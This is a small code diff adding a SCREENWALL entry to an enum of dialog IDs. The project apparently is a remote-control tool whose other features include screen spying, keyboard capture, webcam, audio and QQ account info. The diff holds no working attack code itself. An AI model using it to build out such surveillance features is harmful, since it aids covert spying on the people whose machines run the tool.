@@ -57,6 +57,7 @@ enum
 		//////////////////////////////////////////////////////////////////////////
 		FILEMANAGER_DLG = 1,
 		SCREENSPY_DLG,
+		SCREENWALL_DLG,
 		KEYBOARD_DLG,
 		WEBCAM_DLG,
 		AUDIO_DLG,
@@ -67,7 +68,7 @@ enum
 		REGEDIT_DLG,
 		CHAT_DLG,
 		QQINFO_DLG,
-		PROXYMAP_DLG
+		PROXYMAP_DLG,
 };
 
 typedef struct 
